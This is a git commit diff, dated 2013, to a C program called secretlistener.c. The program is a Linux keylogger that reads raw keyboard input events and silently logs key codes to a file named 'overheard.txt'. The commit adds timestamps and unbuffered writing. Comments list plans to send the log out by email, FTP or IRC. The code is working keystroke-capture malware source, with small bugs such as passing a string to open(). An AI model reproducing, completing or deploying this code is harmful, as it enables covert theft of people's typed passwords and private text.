8c82aced40d60da9de432139eaabc84def80f9d0
cara marie <cara.marie@me.com>
2013-07-30 19:28:07 -0700

    added timestamp

--- secretlistener.c
+++ secretlistener.c
@@ -1,5 +1,5 @@
 /*
-* ADD TIMESTAMP
+* ADD SLEEP
 * ADD ERROR IF USER IS NOT ROOT
 * DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices)
 * ONCE FILE REACHES A CERTAIN SIZE-->EMAIL
@@ -7,43 +7,44 @@
 * ELSE ERROR--->UPLOAD VIA FTP
 * GRAB FROM IRC????
 */
-#include <linux/input.h>	// input_event
-#include <sys/types.h>
-#include <sys/stat.h>
+#include <linux/input.h>
 #include <stdio.h>
-#include <unistd.h>  		// read
-#include <string.h>
+#include <unistd.h>
+#include <time.h>
+
 
 int main(int argc, char **argv) {
 	FILE *listening;
 	int key;
-	char buff[2];  /* sets buffer size -- size of ev.code */
+	key = open(argv[1], "r");	/* opens the event file */
 
 	if(argc < 2) {
 		printf("USAGE: %s <device>\n", argv[0]);
 		return 1;
 	}
 
-	listening = fopen("overheard.txt", "a+");  /* opens/creates the log */
+	listening = fopen("overheard.txt", "a+");  	/* opens/creates the log */
+	setbuf(listening, NULL);					/* forces immediate write to listening */
+	
 	if (listening == NULL) {
 		fprintf(stderr, "ERROR: Log file not found\n");
 		return 1;
 	}
 
-	key = open(argv[1], "r");	/* opens the port */
+	time_t curtime;
+	time(&curtime);
+	fprintf(listening, "\n\n%s", ctime(&curtime));	/* adds timestamp */
+
 	struct input_event ev;		/* using input_event so we 
 								 * know what we're reading 
 								 */
-
 	while(1) {
 		read(key, &ev, sizeof(struct input_event));
 		if(ev.value == 0 && ev.type == 1) {			/* only register release state */
 			fprintf(listening, "%i", ev.code);
-			setvbuf(listening, buff, _IOFBF, 2);	/* forces the write
-													 * to listening 
-													 */
 		}
 	}
+
 	fclose(listening);
 
 	return 0;
